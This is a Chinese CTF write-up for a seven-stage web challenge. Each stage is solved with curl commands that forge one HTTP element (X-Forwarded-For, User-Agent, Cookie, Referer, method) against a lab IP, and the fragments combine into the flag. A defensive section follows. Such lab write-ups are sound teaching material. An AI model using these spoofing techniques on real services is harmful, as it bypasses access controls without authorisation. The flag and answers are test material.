# 喵星信号塔 · 七塔导航 — WriteUp

- 题目：1000 pts / 动态容器 / Web
- 入口：`http://103.163.47.230:32854`
- 指纹：`Server: MeowSignal/1.0 Python/3.12.15`（Python 手写路由，七关 = 七种 HTTP 通信规矩）
- Flag：`HTUCTF{2999bbc1-1aab-45b5-a34a-7aad5f53c932}`（一次解出）

## 1. 题目结构

首页 `/` 列出七座塔，每座塔"只认一种通信规矩"，点进去会给出玉板铭文说明规矩是什么：

```
第1塔 /tower/echo    回响塔  悬浮空中的古钟，敲一下能传遍整颗星球
第2塔 /tower/beacon  信标塔  塔顶一束光刺破云层，为迷航者指路
第3塔 /tower/ghost   幽影塔  塔身透明如鬼魅，访客须『自报家门』
第4塔 /tower/mirror  镜塔    塔身是无数面镜子，只映照来者的『名号』
第5塔 /tower/badge   徽章塔  门前侍卫不认人，只认你胸前那块『小饼干』
第6塔 /tower/compass 罗盘塔  无源之水，须有『引路之证』
第7塔 /tower/void    虚空塔  等待一次"覆盖"与新生
```

每关成功后吐一颗 **base64 星核碎片**，集齐 7 颗**按 1→7 顺序原文直接拼接**（无需解码），
POST 到 `/tower/vault`（表单字段 `answer`），中枢塔校验后放出 flag。

七座塔 = 七种 HTTP 请求要素的伪造：查询串 / 请求体 / 请求头 / 请求方法。

## 2. 七关逐一击破

### 第1塔 · 回响塔 `/tower/echo` —— 查询串参数

规矩："塔只认'路上的暗号'，把 `code=MEOW7` 写在地址栏的查询串里"。

```bash
curl 'http://103.163.47.230:32854/tower/echo?code=MEOW7'
```

碎片在**源码 HTML 注释**里（前端提示"碎片被塞进了页面的暗处"）：

```html
<!-- 星核碎片1号（源码暗处）：SFRVQ1RG -->
```

→ 碎片1 = `SFRVQ1RG`

### 第2塔 · 信标塔 `/tower/beacon` —— POST 表单

规矩："信使只读『信封』里的字，口头喊话一概不理。海上那座为迷航者引路、长明不灭的灯叫什么？"

GET 两手空空会提示"只收信封"，答案就是 `lighthouse`（灯塔），封在 `signal` 名下 POST：

```bash
curl -X POST -d 'signal=lighthouse' 'http://103.163.47.230:32854/tower/beacon'
```

→ 碎片2 = `ezI5OTli`

### 第3塔 · 幽影塔 `/tower/ghost` —— X-Forwarded-For 伪造

规矩："只看你自己填在『转发来源』那一行里的地址——它只认『本机』"。

"转发来源"即 `X-Forwarded-For`，填 `127.0.0.1`：

```bash
curl -H 'X-Forwarded-For: 127.0.0.1' 'http://103.163.47.230:32854/tower/ghost'
```

碎片不在页面里，提示"顺着信号波从**响应头**一起回传了"：

```http
X-Star-Core: CORE3=YmMxLTFh
```

→ 碎片3 = `YmMxLTFh`（取 `CORE3=` 后半段）

### 第4塔 · 镜塔 `/tower/mirror` —— User-Agent 伪造

规矩："镜塔不照皮囊，只照来者『是谁派来的』；它只肯与喵星自家的浏览器说话——报上那个名字：MeowBrowser"。

```bash
curl -A 'MeowBrowser' 'http://103.163.47.230:32854/tower/mirror'
```

碎片"化作解码信号发往控制台（Console）"——页面底部一段 eval 编码的 JS：

```html
<script>eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,34,9733,32,26143,26680,30868,29255,52,21495,65306,89,87,73,116,78,68,86,105,78,81,61,61,34,41));</script>
```

把字符码拼起来就是 `console.log("★ 星核碎片 4 号：YWItNDViNQ==")`：

```python
"".join(chr(c) for c in [99,111,110,115,111,108,101,46,108,111,103,40,34,9733,32,26143,26681,...])
```

→ 碎片4 = `YWItNDViNQ==`

### 第5塔 · 徽章塔 `/tower/badge` —— Cookie 伪造

规矩："侍卫不盘问口令，只认胸前别着的『小饼干』；饼干上写着你的身份——悄悄改成『星猫』（star_cat）"。

"小饼干"= Cookie。先看初始 Cookie：访问任意页面服务端会 `Set-Cookie: user=guest`，
改成 `star_cat` 即可：

```bash
curl -H 'Cookie: user=star_cat' 'http://103.163.47.230:32854/tower/badge'
```

→ 碎片5 = `LWEzNGEt`

### 第6塔 · 罗盘塔 `/tower/compass` —— Referer 伪造

规矩："空手而至者不得入内，须亮出『引路来源』：`http://moonbase/launch`"。

```bash
curl -e 'http://moonbase/launch' 'http://103.163.47.230:32854/tower/compass'
```

→ 碎片6 = `N2FhZDVm`

### 第7塔 · 虚空塔 `/tower/void` —— HTTP 方法 + 请求体

规矩："以『覆』代『取』：用 PUT 方法请求，请求体为 rebirth"。

用 GET 会明确提示"虚空塔拒绝'取'的动作（请改用 PUT 方法，请求体 rebirth）"：

```bash
curl -X PUT --data 'rebirth' 'http://103.163.47.230:32854/tower/void'
```

→ 碎片7 = `NTNjOTMyfQ==`

## 3. 碎片汇总与合成

| # | 塔 | 出处 | 碎片 | base64 解码 |
|---|---|---|---|---|
| 1 | 回响塔 | 源码 HTML 注释 | `SFRVQ1RG` | `HTUCTF` |
| 2 | 信标塔 | 页面正文 | `ezI5OTli` | `{2999b` |
| 3 | 幽影塔 | 响应头 `X-Star-Core` | `YmMxLTFh` | `bc1-1a` |
| 4 | 镜塔 | JS `String.fromCharCode` | `YWItNDViNQ==` | `ab-45b5` |
| 5 | 徽章塔 | 页面正文 | `LWEzNGEt` | `-a34a-` |
| 6 | 罗盘塔 | 页面正文 | `N2FhZDVm` | `7aad5f` |
| 7 | 虚空塔 | 页面正文 | `NTNjOTMyfQ==` | `53c932}` |

拼起来正好是 `HTUCTF{2999bbc1-1aab-45b5-a34a-7aad5f53c932}`（UUID 格式），
说明七段各自是连续 base64 流上按 4 字节组切开的分片——可以直接解码交叉验证拼接是否正确。

提交（**原文直接拼接，不解码**）：

```bash
curl -X POST --data-urlencode \
  'answer=SFRVQ1RGezI5OTliYmMxLTFhYWItNDViNQ==LWEzNGEtN2FhZDVmNTNjOTMyfQ==' \
  'http://103.163.47.230:32854/tower/vault'
# → 七颗星核归位，猫猫的星舰引擎轰鸣着点亮了整片夜空！
# → HTUCTF{2999bbc1-1aab-45b5-a34a-7aad5f53c932}
```

一键复现：`python solve_meow7.py`（纯标准库，无依赖）。

## 附件目录

- `solve_meow7.py` —— 一键复现脚本（七关请求 → 提取碎片 → 拼接 → 提交 vault）
- `附件/` —— 本题无平台下载件，存放 2026-10-24 的真实抓包留证：
  首页、七座塔的成功页（碎片3号的响应头单独存为 `第3塔_ghost_响应头.txt`）

## 4. 踩坑

- **手工拼接打错一个字符**：第一次提交把碎片2的 `ezI5` 误敲成 `e3I5`，被判"拼接结果不对"。
  七段 base64 各自解码后拼接恰好等于完整 flag，这个性质可以用来校验。
- 提交时必须 `--data-urlencode`：拼接串里含 `=` `+` `/`，裸 POST 会被 URL 编码规则吃掉。
- 每关的提示话术就是解题钥匙（"暗处"=注释、"信封"=表单、"转发来源"=XFF、"小饼干"=Cookie、
  "引路来源"=Referer、"覆"=PUT），不用乱扫。

## 5. 防御视角

- 头信息（`X-Forwarded-For`、`User-Agent`、`Referer`、`Cookie`）全部是**客户端可伪造**的，
  永远不能拿来做鉴权/白名单判据，这类"规矩"本身就是反面教材。
- 认证类 Cookie 应做签名（HMAC）或加 HttpOnly，避免客户端随意改写身份字段。
- 首页 `/` 与各塔页面把全部规则、答案提示都明文写在页面上，敏感玩法应隐藏而非提示。
